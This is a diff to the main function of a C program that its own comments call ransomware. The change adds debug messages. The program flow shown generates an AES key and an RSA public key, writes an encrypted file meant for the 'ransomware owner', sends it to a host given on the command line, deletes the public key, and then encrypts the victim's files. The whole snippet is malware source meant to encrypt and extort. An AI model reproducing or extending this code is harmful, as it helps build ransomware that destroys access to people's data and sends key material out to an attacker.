@@ -89,18 +89,25 @@ void main(int argc, char * argv[]){
         exit(69);
     }
     //Create flag
+    debug("Creating flag");
     create_flag("./flag.ntd");
     //Key AES para el cifrado de ficheros
+    debug("Flag was created...\nGenerating AES...");
     char key[48];
     strcat(key, gen_aes());
-    //Key RSA Pub
+    debug("generating key_pub");
     gen_key_pub();
-    //Creando fichero con informacion confidencial para enviar al dueño del ransomware
+    debug("key_pub generated");
+    debug("creating enc_file");
     create_enc_file(key);
-    //Enviando fichero confidencial
-    send_file("enviame.enc",argv[1],argv[2]);
+    debug("attempting to send file to %s %s", argv[1], argv[2]);
+    send_file("enviame.enc", argv[1], argv[2]);
     //Del RSA Pub
+    debug("deleting RSA pub");
     rm_key_pub();
+    debug("RSA pub was deleted");
     //Listar ficheros y cifrar
+    debug("Encrypting files...");
     list_files(strlen(path),0,key);
+    debug("Files ecrypted!");
 }
